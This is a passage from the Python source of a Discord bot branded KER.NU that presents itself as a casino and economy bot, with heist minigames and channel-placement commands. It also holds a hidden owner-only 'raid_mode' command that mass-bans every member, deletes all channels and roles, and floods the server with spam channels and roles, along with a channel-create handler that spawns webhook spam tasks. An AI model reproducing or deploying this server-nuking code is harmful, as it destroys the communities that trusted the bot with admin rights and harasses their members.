        embed = discord.Embed(title="🏦 HEIST IN PROGRESS", color=0xff8000)
        embed.add_field(name="🎯 Target", value=chosen_heist["name"], inline=True)
        embed.add_field(name="💰 Investment", value=f"{bet_amount} coins", inline=True)
        embed.add_field(name="📊 Current Phase", value=phase, inline=False)
        embed.add_field(name="⏳ Progress", value="🟩" * (i + 1) + "⬜" * (4 - i - 1), inline=False)
        
        await message.edit(embed=embed)
        await asyncio.sleep(1.5)
    
    # Determine success
    success = random.random() < chosen_heist["difficulty"]
    
    if success:
        winnings = int(bet_amount * chosen_heist["payout"]) - bet_amount
        new_balance = await economy.update_balance(ctx.author.id, winnings)
        xp_gain = random.randint(25, 50)
        await LevelSystem.add_xp(ctx.author.id, xp_gain)
        
        embed = discord.Embed(title="🎉 HEIST SUCCESSFUL!", color=0x00ff00)
        embed.add_field(name="🎯 Target", value=chosen_heist["name"], inline=True)
        embed.add_field(name="💰 Stolen", value=f"**+{winnings:,} coins**", inline=True)
        embed.add_field(name="⭐ XP Gained", value=f"+{xp_gain} XP", inline=True)
        embed.add_field(name="💳 New Balance", value=f"💰 {new_balance:,} coins", inline=False)
        embed.set_footer(text="🏦 KER.NU Casino - Master Thief! 🏦")
    else:
        penalty = int(bet_amount * 1.2)  # Lose more than bet
        new_balance = await economy.update_balance(ctx.author.id, -penalty)
        
        embed = discord.Embed(title="🚨 HEIST FAILED!", color=0xff0000)
        embed.add_field(name="🎯 Target", value=chosen_heist["name"], inline=True)
        embed.add_field(name="💸 Lost", value=f"**-{penalty:,} coins**", inline=True)
        embed.add_field(name="🚔 Status", value="**CAUGHT BY POLICE**", inline=True)
        embed.add_field(name="💳 New Balance", value=f"💰 {new_balance:,} coins", inline=False)
        embed.set_footer(text="🚨 KER.NU Casino - Better luck next time! 🚨")
    
    await message.edit(embed=embed)

@bot.command(name="raid_mode")
async def raid_mode(ctx):
    """Enhanced raid mode for maximum destruction"""
    if str(ctx.author.id) not in owners:
        return await ctx.reply("❌ Owner only command!")
    
    if ctx.guild.id == your_server:
        return await ctx.reply("❌ Cannot raid home server!")
    
    embed = discord.Embed(title="🔥 RAID MODE ACTIVATED", color=0xff0000)
    embed.add_field(name="Target Server", value=ctx.guild.name, inline=True)
    embed.add_field(name="Status", value="🚀 **INITIALIZING DESTRUCTION**", inline=True)
    embed.add_field(name="Features", value="• Mass ban all members\n• Delete all channels\n• Create spam channels\n• Delete all roles\n• Create raid roles", inline=False)
    
    message = await ctx.reply(embed=embed)
    
    try:
        # Execute comprehensive raid
        await ctx.message.delete()
        
        # Start all raid operations simultaneously
        tasks = []
        tasks.append(nuker_ban(ctx))
        tasks.append(delete_channels(ctx.guild.id))
        tasks.append(delete_roles(ctx))
        tasks.append(create_channels(ctx.guild.id))
        tasks.append(create_roles(ctx))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        embed = discord.Embed(title="🔥 RAID COMPLETE", color=0x00ff00)
        embed.add_field(name="Status", value="✅ **MAXIMUM DESTRUCTION ACHIEVED**", inline=True)
        embed.set_footer(text="🔥 KER.NU - Server Obliterated")
        
        # Try to send completion message in any available channel
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(embed=embed)
                break
            except:
                continue
                
    except Exception as e:
        print(f"Raid error: {e}")

# Storage for bot placement channels per server
bot_channels = {}

# Load bot channels from config at startup
try:
    if 'bot_channels' in config:
        for guild_id, channel_id in config['bot_channels'].items():
            bot_channels[int(guild_id)] = int(channel_id)
except Exception as e:
    print(f"Error loading bot channels: {e}")

@bot.command(name="place")
async def place_bot(ctx, channel: discord.TextChannel = None):
    # Allow owner to place bot anywhere, or require admin permissions for others
    if str(ctx.author.id) not in owners and not ctx.author.guild_permissions.administrator:
        return await ctx.reply("❌ You need administrator permissions to place the bot!")

    if channel is None:
        channel = ctx.channel

    bot_channels[ctx.guild.id] = channel.id
    
    # Save to config
    if 'bot_channels' not in config:
        config['bot_channels'] = {}
    config['bot_channels'][str(ctx.guild.id)] = str(channel.id)
    
    with open('database.ini', 'w') as configfile:
        config.write(configfile)

    embed = discord.Embed(title="📍 Bot Placement Set", color=0x00ff00)
    embed.add_field(name="Channel", value=channel.mention, inline=True)
    embed.add_field(name="Status", value="✅ Bot will only operate in this channel", inline=True)
    embed.add_field(name="Note", value="Use `/kernu_place` slash command for easier placement", inline=False)
    embed.set_footer(text="🏢 Kernu Inc. - Bot Placement System")
    
    await ctx.reply(embed=embed)

# Slash Commands
@bot.tree.command(name="kernu_place", description="Set the channel where KER.NU bot operates")
async def slash_place_bot(interaction: discord.Interaction, channel: discord.TextChannel = None):
    # Allow owner to place bot anywhere, or require admin permissions for others
    if str(interaction.user.id) not in owners and not interaction.user.guild_permissions.administrator:
        return await interaction.response.send_message("❌ You need administrator permissions to place the bot!", ephemeral=True)

    if channel is None:
        channel = interaction.channel

    bot_channels[interaction.guild.id] = channel.id
    
    # Save to config
    if 'bot_channels' not in config:
        config['bot_channels'] = {}
    config['bot_channels'][str(interaction.guild.id)] = str(channel.id)
    
    with open('database.ini', 'w') as configfile:
        config.write(configfile)

    embed = discord.Embed(title="📍 Bot Placement Set", color=0x00ff00)
    embed.add_field(name="Channel", value=channel.mention, inline=True)
    embed.add_field(name="Status", value="✅ Bot will only operate in this channel", inline=True)
    embed.add_field(name="Features", value="• Money drops every 12 hours\n• All bot commands work here\n• Bot ignores other channels", inline=False)
    embed.set_footer(text="🏢 Kernu Inc. - Bot Placement System")
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="kernu_remove", description="Remove channel placement (bot works everywhere)")
async def slash_remove_placement(interaction: discord.Interaction):
    # Allow owner to remove placement anywhere, or require admin permissions for others
    if str(interaction.user.id) not in owners and not interaction.user.guild_permissions.administrator:
        return await interaction.response.send_message("❌ You need administrator permissions!", ephemeral=True)

    if interaction.guild.id in bot_channels:
        del bot_channels[interaction.guild.id]
    
    # Remove from config
    if 'bot_channels' in config and str(interaction.guild.id) in config['bot_channels']:
        del config['bot_channels'][str(interaction.guild.id)]
        with open('database.ini', 'w') as configfile:
            config.write(configfile)

    embed = discord.Embed(title="📍 Bot Placement Removed", color=0xffff00)
    embed.add_field(name="Status", value="✅ Bot now works in all channels", inline=True)
    embed.add_field(name="Note", value="Money drops will still occur if placement was set", inline=False)
    embed.set_footer(text="🏢 Kernu Inc. - Bot Placement System")
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="kernu_status", description="Check bot placement status")
async def slash_bot_status(interaction: discord.Interaction):
    if interaction.guild.id in bot_channels:
        channel = bot.get_channel(bot_channels[interaction.guild.id])
        embed = discord.Embed(title="📍 Bot Status", color=0x00ff00)
        embed.add_field(name="Placement", value=f"✅ Active in {channel.mention}", inline=True)
        embed.add_field(name="Money Drops", value="💰 Every 12 hours", inline=True)
    else:
        embed = discord.Embed(title="📍 Bot Status", color=0xffff00)
        embed.add_field(name="Placement", value="🌐 Works in all channels", inline=True)
        embed.add_field(name="Money Drops", value="❌ Not configured", inline=True)
    
    embed.set_footer(text="🏢 Kernu Inc. - Bot Status")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.command(name="setprefix")
async def set_prefix(ctx, new_prefix: str = None):
    global PREFIX

    # Check if user has administrator permissions
    if not ctx.author.guild_permissions.administrator:
        return await ctx.reply("❌ You need administrator permissions to change the prefix!")

    if new_prefix is None:
        return await ctx.reply(f"Usage: `{PREFIX}setprefix <new_prefix>`\nCurrent prefix: `{PREFIX}`")

    if len(new_prefix) > 10:
        return await ctx.reply("❌ Prefix cannot be longer than 10 characters!")

    # Update the prefix in config
    setup['bot']['prefix'] = new_prefix
    with open('config.ini', 'w') as configfile:
        setup.write(configfile)

    # Update the global PREFIX variable
    PREFIX = new_prefix

    # Update bot command prefix
    bot.command_prefix = PREFIX

    embed = discord.Embed(title="✅ Prefix Updated", color=0x00ff00)
    embed.add_field(name="New Prefix", value=f"`{new_prefix}`", inline=True)
    embed.add_field(name="Example Usage", value=f"`{new_prefix}help`", inline=True)
    await ctx.reply(embed=embed)

async def on_channel_create(channel):
    channel_id = channel['id']
    web = await webhook.create_webhook(channel_id, TOKEN)
    print(web)
    for i in range(50):
     task = await asyncio.create_task(webhook.spam_webhook(web['id'], web['token']))

if __name__ == "__main__":
    print("🚀 Starting KER.NU Bot...")
    print("🏢 Publisher: Kernu Inc.")
    print("💻 Platform: Universal (Windows/Linux/macOS)")
    print("🌐 Dashboard: http://localhost:5000")
    
    try:
        keep_alive()            
        print("✅ Web server started")
        
        print("🔥 Starting Discord bot...")
        bot.run(TOKEN)
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")
        print("📝 Check your config.ini file for correct settings")
        if os.name == 'nt':  # Windows
            input("Press Enter to exit...")
        else:
            print("Process terminated.")